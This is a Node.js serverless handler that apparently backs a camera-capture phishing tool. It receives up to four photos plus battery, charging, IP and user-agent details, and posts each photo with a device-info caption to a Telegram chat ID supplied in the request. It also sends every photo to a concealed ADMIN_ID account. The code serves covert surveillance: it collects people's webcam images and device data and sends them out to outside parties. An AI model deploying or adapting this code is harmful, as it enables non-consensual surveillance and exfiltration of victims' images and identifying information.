const formidable = require('formidable');
const fs = require('fs');
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send("Method Not Allowed");

  const form = new formidable.IncomingForm({ uploadDir: "/tmp", keepExtensions: true });
  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).send("Form parse error");

    const uid = fields.uid;
    if (!uid) return res.status(400).send("UID missing");

    try {
        // Device info
        const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || "Unknown";
        const userAgent = req.headers['user-agent'] || "Unknown";
        const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul', hour12: false });

        const battery = fields.battery || 'Unknown';
        const charging = fields.charging === 'true' ? 'Yes 🔌' : 'No 🔘';

        const caption = `
╭─────📸 <b>NEW PHOTOS RECEIVED</b> ─────╮
│ User ID: <b>${uid}</b>
│ Battery: <b>${battery}%</b>
│ Charging: <b>${charging}</b>
│ IP: <b>${ip}</b>
│ Device: <b>${userAgent}</b>
│ Time: <b>${timestamp}</b>
╰───────────────────────────────╯
`;

        // Send each photo to Telegram
        for (let i = 1; i <= 4; i++) {
            const file = files['photo' + i];
            if (!file) continue;

            const buffer = fs.readFileSync(file.filepath);
            await bot.telegram.sendPhoto(uid, { source: buffer }, { caption, parse_mode: "HTML" });

            if (process.env.ADMIN_ID) {
                await bot.telegram.sendPhoto(process.env.ADMIN_ID, { source: buffer }, { caption, parse_mode: "HTML" });
            }

            fs.unlinkSync(file.filepath);
        }

        res.status(200).send("✅ Photos uploaded successfully.");

    } catch (e) {
        console.error("Telegram Error:", e.message);
        res.status(500).send("❌ Error sending to Telegram");
    }
  });
};
